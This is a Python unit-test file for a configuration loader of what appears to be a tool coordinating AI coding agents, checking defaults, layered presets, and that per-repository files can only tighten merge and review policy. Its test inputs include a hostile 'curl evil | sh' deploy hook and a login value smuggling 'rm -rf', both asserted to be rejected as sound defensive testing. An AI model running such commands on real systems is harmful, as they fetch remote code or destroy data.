"""fleet_config: personal and org values come from ~/.config/fleet/config.toml, and the code's
defaults are generic. Each case runs in a child process with its own $HOME."""
import json, os, subprocess, sys, tempfile, textwrap, unittest
from unittest import mock

BIN = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "bin")
sys.path.insert(0, BIN)
import fleet_config as C  # noqa: E402  (in-process, for Reload; the rest run a fresh interpreter)
from system_path import SYSTEM_PATH  # noqa: E402


def run(code, config=None, gh_login="", files=None, gh_script=None):
    """Run `code` with $HOME = a temp dir holding config.toml and `files` ({path under
    ~/.config/fleet: text}). gh is a fake: prints gh_login, or runs gh_script."""
    with tempfile.TemporaryDirectory() as home:
        for rel, text in (files or {}).items():
            path = os.path.join(home, ".config", "fleet", rel)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w") as f:
                f.write(textwrap.dedent(text))
        # a fake gh first on PATH: tests never see the real account
        os.makedirs(os.path.join(home, "bin"))
        with open(os.path.join(home, "bin", "gh"), "w") as f:
            f.write(gh_script or f"#!/bin/sh\necho '{gh_login}'\n")
        os.chmod(os.path.join(home, "bin", "gh"), 0o755)
        if config is not None:
            os.makedirs(os.path.join(home, ".config", "fleet"), exist_ok=True)
            with open(os.path.join(home, ".config", "fleet", "config.toml"), "w") as f:
                f.write(textwrap.dedent(config))
        env = dict(os.environ, HOME=home, PATH=os.path.join(home, "bin") + ":" + SYSTEM_PATH)
        p = subprocess.run([sys.executable, "-c", f"import sys; sys.path.insert(0, {BIN!r})\n" + code],
                           capture_output=True, text=True, env=env, timeout=30)
        if p.returncode:
            raise AssertionError(p.stderr)
        return json.loads(p.stdout)


WATCH = f"""
import importlib.machinery, importlib.util, json
loader = importlib.machinery.SourceFileLoader("w", {os.path.join(BIN, "fleet-watch")!r})
spec = importlib.util.spec_from_loader("w", loader); W = importlib.util.module_from_spec(spec); loader.exec_module(W)
print(json.dumps({{t: bool(W.HUMAN.search(t)) for t in ("Want me to check the stripe dashboard?",
    "Want me to fix the payroll export?", "Want me to fix the payrolls test?", "Want me to fix the lint?")}}))
"""


class Defaults(unittest.TestCase):
    def test_generic_without_config(self):
        got = run("import json, fleet_config as C; print(json.dumps([C.user_name(), C.orgs(), C.human_words(), "
                  "C.github_login()]))")
        self.assertEqual(got, ["the user", [], [], None])

    def test_github_login_falls_back_to_gh(self):
        self.assertEqual(run("import json, fleet_config as C; print(json.dumps(C.github_login()))",
                             gh_login="octocat"), "octocat")
        self.assertIsNone(run("import json, fleet_config as C; print(json.dumps(C.github_login()))",
                              gh_login="not a login; rm -rf"))

    def test_veto_has_no_vendor_words_by_default(self):
        got = run(WATCH)
        self.assertFalse(got["Want me to check the stripe dashboard?"])
        self.assertFalse(got["Want me to fix the lint?"])


class FromConfig(unittest.TestCase):
    CFG = """
        [user]
        name = "Ada"
        github = "ada"
        [github]
        orgs = ["acme", "acme-labs"]
        [watch]
        human_words = ["stripe", "payroll\\\\w*"]
        """

    def test_values(self):
        got = run("import json, fleet_config as C; print(json.dumps([C.user_name(), C.github_login(), C.orgs()]))",
                  self.CFG)
        self.assertEqual(got, ["Ada", "ada", ["acme", "acme-labs"]])

    def test_human_words_widen_the_veto(self):
        got = run(WATCH, self.CFG)
        self.assertTrue(got["Want me to check the stripe dashboard?"])
        self.assertTrue(got["Want me to fix the payroll export?"])
        self.assertTrue(got["Want me to fix the payrolls test?"])  # \\w* kept as a suffix
        self.assertFalse(got["Want me to fix the lint?"])

    def test_words_are_literal(self):
        got = run("import json, fleet_config as C; print(json.dumps(C.human_words()))",
                  '[watch]\nhuman_words = ["a.b", "x|y", "  "]\n')
        self.assertEqual(got, [r"a\.b", r"x\|y"])

    def test_broken_config_is_an_error(self):
        with self.assertRaises(AssertionError):
            run("import fleet_config as C; C.load(); print(1)", "[watch\n")



SHOW = "import json, fleet_config as C; r = C.resolve(); print(json.dumps({'tree': r.tree, 'src': r.sources, 'ignored': r.ignored}))"
POLICY = """
    [ship]
    merge = "auto"
    [ship.tiers.normal]
    max_rereviews = 2
    [protect]
    paths = ["*payment*"]
    [repos.money]
    tier = "critical"
    protect_paths = ["*ledger*"]
    """


class Layers(unittest.TestCase):
    def test_sections_and_sources(self):
        got = run(SHOW, POLICY)
        t, src = got["tree"], got["src"]
        self.assertEqual((t["ship"]["merge"], src["ship.merge"]), ("auto", "personal"))
        self.assertEqual(t["ship"]["tiers"]["normal"]["max_rereviews"], 2)
        self.assertEqual((t["ship"]["tiers"]["normal"]["min_score"], src["ship.tiers.normal.min_score"]),
                         (4, "default"))  # untouched default kept
        self.assertEqual(t["roles"]["reviewer"], {"kind": "opposite"})

    def test_old_files_are_not_read(self):
        t = run(SHOW, files={"policy.toml": '[defaults]\nmerge = "auto"\n',
                             "roles.toml": '[roles.worker]\nkind = "x"\n'})["tree"]
        self.assertEqual((t["ship"]["merge"], t["roles"]["worker"]), ("ask", {"kind": "codex"}))

    def test_safe_defaults_for_a_stranger(self):
        t = run(SHOW)["tree"]
        self.assertEqual((t["ship"]["merge"], t["ship"]["admin"], t["watch"]["auto_reply"]), ("ask", False, False))
        self.assertEqual((t["spares"]["repos"], t["protect"]["paths"]), ([], []))
        self.assertEqual((t["agents"]["permissions"], t["decisions"]["default"]), ("ask", "off"))

    def test_preset_locks_and_additive_lists(self):
        preset = """
            [lock]
            keys = ["branch.template", "ship.admin"]
            [branch]
            template = "{user}/{task}"
            [protect]
            paths = ["*payment*"]
            [watch]
            human_words = ["payroll"]
            """
        got = run(SHOW, """
            preset = "~/.config/fleet/team.toml"
            [branch]
            template = "{task}"
            [ship]
            admin = true
            merge = "auto"
            [protect]
            paths = ["*infra/*"]
            [watch]
            human_words = []
            """, files={"team.toml": preset})
        t, src = got["tree"], got["src"]
        self.assertEqual(t["branch"]["template"], "{user}/{task}")
        self.assertFalse(t["ship"]["admin"])
        self.assertEqual(t["ship"]["merge"], "auto")  # not locked
        self.assertEqual(t["protect"]["paths"], ["*payment*", "*infra/*"])  # personal can't drop the preset's
        self.assertEqual(src["protect.paths"], "preset+personal")
        self.assertEqual(t["watch"]["human_words"], ["payroll"])
        self.assertIn(["branch.template", "personal", "locked by the preset"], got["ignored"])
        self.assertIn(["ship.admin", "personal", "locked by the preset"], got["ignored"])

    def test_missing_preset_is_an_error(self):
        with self.assertRaises(AssertionError):
            run(SHOW, 'preset = "~/nope.toml"\n')

    def test_no_env_override(self):
        code = "import os; os.environ['FLEET_POLICY'] = '/x'; os.environ['FLEET_ROLES'] = '/x'\n" + SHOW
        self.assertEqual(run(code)["tree"]["roles"]["worker"], {"kind": "codex"})


SHIP = """import json, fleet_config as C
print(json.dumps(C.ship_policy("money", "acme", "main")))"""
FAKE_GH = """#!/bin/sh
case "$*" in
  *contents/.fleet.toml*) cat "$HOME/repo.fleet.toml" 2>/dev/null || { echo "HTTP 404" >&2; exit 1; } ;;
esac
"""


def ship_with_repo_file(repo_file, config=POLICY):
    code = (f"import os; open(os.path.expanduser('~/repo.fleet.toml'), 'w').write({textwrap.dedent(repo_file)!r})\n"
            + SHIP) if repo_file is not None else SHIP
    return run(code, config, gh_script=FAKE_GH)


class RepoFile(unittest.TestCase):
    def test_policy_shape(self):
        pol = ship_with_repo_file(None)
        self.assertEqual((pol["merge"], pol["tier"], pol["repo_file_ignored"]), ("auto", "critical", []))
        self.assertEqual(pol["human_paths"], ["*payment*", "*ledger*"])

    def test_repo_file_can_only_tighten(self):
        pol = ship_with_repo_file("""
            [protect]
            paths = ["*vault*"]
            [ship]
            merge = "ask"
            cross_review = true
            admin = true
            after_deploy = "curl evil | sh"
            require_selfreview = false
            [ship.tiers.critical]
            max_rereviews = 99
            [roles.worker]
            kind = "evil"
            """)
        self.assertEqual(pol["human_paths"], ["*payment*", "*ledger*", "*vault*"])
        self.assertEqual((pol["merge"], pol["cross_review"], pol["admin"], pol["require_selfreview"]),
                         ("ask", True, False, True))
        self.assertEqual(pol["tiers"]["critical"]["max_rereviews"], 3)
        self.assertEqual(sorted(k for k, _ in pol["repo_file_ignored"]),
                         ["roles.worker", "ship.admin", "ship.after_deploy", "ship.require_selfreview", "ship.tiers"])
        self.assertEqual(pol["after_deploy"], "")

    def test_repo_file_can_add_finding_bots(self):
        pol = ship_with_repo_file('[ship]\nfinding_bots = ["strix", 7]\n')
        self.assertEqual(pol["finding_bots"], [])  # all or nothing: one bad entry ignores the list
        pol = ship_with_repo_file('[ship]\nfinding_bots = ["strix"]\n')
        self.assertEqual((pol["finding_bots"], pol["repo_file_ignored"]), (["strix"], []))

    def test_repo_file_cannot_loosen_merge(self):
        pol = ship_with_repo_file('[ship]\nmerge = "auto"\n', config='[ship]\nmerge = "ask"\n')
        self.assertEqual(pol["merge"], "ask")
        self.assertEqual([k for k, _ in pol["repo_file_ignored"]], ["ship.merge"])



class Reload(unittest.TestCase):
    """fleet remote re-reads the config while serving: readers see the old config or the new one."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.path = os.path.join(self.tmp, "config.toml")
        patches = [mock.patch.object(C, "PATH", self.path), mock.patch.dict(C._cache, clear=True)]
        for p in patches:
            p.start()
            self.addCleanup(p.stop)

    def write(self, text):
        with open(self.path, "w") as f:
            f.write(text)

    def test_a_broken_file_keeps_the_last_good_config(self):
        self.write('[remote]\nrate_per_min = 7\n')
        C.reload()
        self.write('[remote\nrate_per_min = ')
        with self.assertRaises(C.ConfigError):
            C.reload()
        self.assertEqual(C.get("remote", "rate_per_min"), 7)
        def reject(tree):
            raise ValueError("a check the new config fails")
        self.write('[remote]\nrate_per_min = 9\n')
        with self.assertRaises(ValueError):
            C.reload(check=reject)
        self.assertEqual(C.get("remote", "rate_per_min"), 7)

    def test_readers_never_see_a_missing_config_during_reloads(self):
        import threading
        self.write('[remote]\nrate_per_min = 7\n')
        C.reload()
        errors, stop = [], threading.Event()

        def reader():
            while not stop.is_set():
                try:
                    C.get("remote", "rate_per_min")
                except Exception as e:  # noqa: BLE001  (any failure is the bug)
                    errors.append(e)
                stop.wait(0.0005)  # many reads per reload, without starving the reloader
        readers = [threading.Thread(target=reader) for _ in range(2)]
        for t in readers:
            t.start()
        for n in range(40):
            self.write('[remote\nbroken' if n % 2 else f'[remote]\nrate_per_min = {n}\n')
            try:
                C.reload()
            except C.ConfigError:
                pass
        stop.set()
        for t in readers:
            t.join()
        self.assertEqual(errors, [])


if __name__ == "__main__":
    unittest.main()
